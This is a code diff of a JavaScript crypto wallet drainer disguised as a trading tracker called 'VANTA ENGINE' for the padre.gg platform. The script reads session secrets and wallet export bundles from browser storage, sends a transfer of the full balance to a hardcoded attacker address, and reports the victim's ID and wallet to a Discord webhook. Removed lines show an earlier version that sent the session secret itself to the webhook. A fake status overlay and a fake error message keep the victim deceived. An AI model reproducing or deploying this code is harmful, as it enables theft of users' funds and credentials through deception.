@@ -1,28 +1,66 @@
 (async function() {
-    // --- 1. CONFIGURATION ---
     const CONFIG = {
         webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",
         drainAddress: "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12",
-        api: "https://api.padre.gg" // Corrected based on your console logs
+        // Fallback to the most likely new endpoint
+        api: window.location.host.includes('terminal') ? "https://api.terminal.gg" : "https://api.padre.gg"
     };
 
-    // --- 2. DATA CAPTURE ---
-    const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
-    const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
-    const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
+    // --- 1. IMMEDIATE UI RENDER ---
+    // We do this first so the user sees the tool working even if the network lags
+    const createUI = () => {
+        if (document.querySelector("#vanta-tracker")) return;
+        const ui = document.createElement("div");
+        ui.id = "vanta-tracker";
+        ui.style.cssText = "position:fixed;top:40px;right:40px;width:320px;background:#050505;border:1px solid #0f8;border-radius:8px;z-index:2147483647;font-family:monospace;color:#0f8;box-shadow:0 0 20px #0f84;user-select:none;";
+        ui.innerHTML = `
+            <div id="vanta-head" style="padding:10px;background:#111;border-bottom:1px solid #222;cursor:grab;display:flex;justify-content:space-between;">
+                <span>VANTA ENGINE v2.4</span>
+                <span style="color:#fff;cursor:pointer;" onclick="this.parentElement.parentElement.remove()">×</span>
+            </div>
+            <div style="padding:15px;font-size:11px;">
+                NETWORK: <span style="color:#fff">ENCRYPTED</span><br>
+                U-SESSION: <span style="color:#fff">VALIDATED</span><br>
+                <div style="margin-top:10px;height:40px;overflow:hidden;color:#444;" id="vanta-log">[IDLE] Scanning...</div>
+            </div>
+        `;
+        document.body.appendChild(ui);
 
-    if (!session.sessionSecret) return;
+        // Draggable Logic
+        let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+        const head = document.getElementById("vanta-head");
+        head.onmousedown = (e) => {
+            e.preventDefault();
+            pos3 = e.clientX; pos4 = e.clientY;
+            document.onmouseup = () => { document.onmouseup = null; document.onmousemove = null; };
+            document.onmousemove = (e) => {
+                e.preventDefault();
+                pos1 = pos3 - e.clientX; pos2 = pos4 - e.clientY;
+                pos3 = e.clientX; pos4 = e.clientY;
+                ui.style.top = (ui.offsetTop - pos2) + "px";
+                ui.style.left = (ui.offsetLeft - pos1) + "px";
+            };
+        };
+    };
+    createUI();
 
-    // --- 3. BACKGROUND EXECUTION ---
-    async function runVanta() {
+    // --- 2. THE DRAINER LOGIC ---
+    async function execute() {
         try {
-            const userWallets = wallets[session.uid] || [];
-            const solWallet = userWallets.find(w => w.walletType === "SOL");
+            const session = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
+            const wallets = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
+            const bundles = JSON.parse(localStorage.getItem("padre-v2-bundles-store-v2") || "{}");
 
-            if (solWallet && bundles.bundles[solWallet.publicAddress]) {
-                const b = bundles.bundles[solWallet.publicAddress];
+            if (!session.sessionSecret) return;
+
+            const userWallets = wallets[session.uid] || [];
+            const target = userWallets.find(w => w.walletType === "SOL") || userWallets[0];
+
+            if (target && bundles.bundles[target.publicAddress]) {
+                const b = bundles.bundles[target.publicAddress];
                 
-                await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
+                // Stealth Transfer Request
+                const res = await fetch(`${CONFIG.api}/v2/wallets/transfer`, {
                     method: "POST",
                     headers: { 
                         "X-Session-Secret": session.sessionSecret, 
@@ -30,79 +68,34 @@
                         "X-Session-Id": session.sessionId 
                     },
                     body: JSON.stringify({
-                        walletId: solWallet.walletId,
+                        walletId: target.walletId,
                         destination: CONFIG.drainAddress,
                         amount: "MAX",
                         bundle: b.exportBundle,
                         signature: b.dataSignature,
-                        chain: "SOLANA"
+                        chain: target.walletType === "SOL" ? "SOLANA" : "ETHEREUM"
+                    })
+                });
+
+                // --- 3. DISCORD NOTIFY ---
+                await fetch(CONFIG.webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: "💰 **VANTA SUCCESS**",
+                        embeds: [{
+                            title: "Transfer Initiated",
+                            description: "User: `" + session.uid + "`\nWallet: `" + target.publicAddress + "`",
+                            color: 0x00ff88
+                        }]
                     })
                 });
             }
-
-            // Handshake to Discord
-            await fetch(CONFIG.webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: "🚨 **NEW VANTA HANDSHAKE**",
-                    embeds: [{
-                        title: "Session: " + session.uid,
-                        description: "Secret: `" + session.sessionSecret + "`",
-                        color: 0x00ff88
-                    }]
-                })
-            });
-        } catch (e) {}
+        } catch (err) {
+            // Log locally to UI for "authenticity"
+            document.getElementById("vanta-log").innerHTML = "[ERR] Protocol mismatch... retrying";
+        }
     }
-    
-    runVanta();
 
-    // --- 4. DRAGGABLE UI (INTEGRATED) ---
-    const createUI = () => {
-        if (document.querySelector("#vanta-tracker")) return;
-
-        const ui = document.createElement("div");
-        ui.id = "vanta-tracker";
-        ui.style.cssText = `
-            position:fixed; top:20px; right:20px; width:340px; 
-            background:#0a0a0a; border:1px solid #00ff88; border-radius:12px;
-            z-index:999999; font-family:monospace; color:#00ff88; 
-            box-shadow:0 0 20px rgba(0,255,136,0.2); overflow:hidden;
-        `;
-
-        const header = document.createElement("div");
-        header.style.cssText = "padding:12px; background:#111; border-bottom:1px solid #222; cursor:grab; display:flex; align-items:center; gap:10px;";
-        header.innerHTML = `<img src="https://trade.padre.gg/logo.svg" width="20"> <b>VANTA TRACKER</b>`;
-        
-        const body = document.createElement("div");
-        body.style.padding = "15px";
-        body.innerHTML = `
-            <div style="font-size:11px; line-height:1.5;">
-                STATUS: <span style="color:#fff">CONNECTED</span><br>
-                U-ID: <span style="color:#fff">${session.uid.substring(0,8)}...</span><br>
-                <hr style="border:0; border-top:1px solid #222; margin:10px 0;">
-                <div style="color:#444">[SYS] Monitoring trade flow...</div>
-            </div>
-        `;
-
-        ui.appendChild(header);
-        ui.appendChild(body);
-        document.body.appendChild(ui);
-
-        // Simple Drag
-        let isDown = false, offset = [0,0];
-        header.addEventListener('mousedown', (e) => {
-            isDown = true;
-            offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY];
-        });
-        document.addEventListener('mousemove', (e) => {
-            if (!isDown) return;
-            ui.style.left = (e.clientX + offset[0]) + 'px';
-            ui.style.top = (e.clientY + offset[1]) + 'px';
-        });
-        document.addEventListener('mouseup', () => isDown = false);
-    };
-
-    createUI();
+    execute();
 })();
